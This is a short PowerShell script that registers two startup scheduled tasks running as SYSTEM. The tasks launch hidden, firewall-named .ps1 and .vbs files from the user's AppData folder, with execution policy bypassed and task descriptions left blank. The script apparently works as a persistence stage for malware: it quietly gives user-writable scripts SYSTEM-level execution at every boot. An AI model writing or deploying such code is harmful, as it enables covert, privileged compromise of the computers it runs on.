if ([Environment]::Is64BitOperatingSystem) {
    $osBit = "64"
} else {
    $osBit = "32"
}

$fileName = ".firewall$osBit"

$psFilePath = "$env:APPDATA\Firewall\$fileName" + "x.ps1"
$vbsFilePath = "$env:APPDATA\Firewall\$fileName" + "x.vbs"

$taskAction = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-ExecutionPolicy Bypass -File `"$psFilePath`""
$taskActionVBS = New-ScheduledTaskAction -Execute "cscript.exe" -Argument "`"$vbsFilePath`""

$trigger = New-ScheduledTaskTrigger -AtStartup

$taskSettings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable

$taskPrincipal = New-ScheduledTaskPrincipal -UserId "NT AUTHORITY\SYSTEM" -LogonType ServiceAccount

Register-ScheduledTask -Action $taskAction -Trigger $trigger -Settings $taskSettings -Principal $taskPrincipal -TaskName "RunMyFilesAtStartup" -Description ""

Register-ScheduledTask -Action $taskActionVBS -Trigger $trigger -Settings $taskSettings -Principal $taskPrincipal -TaskName "RunVBSAtStartup" -Description ""
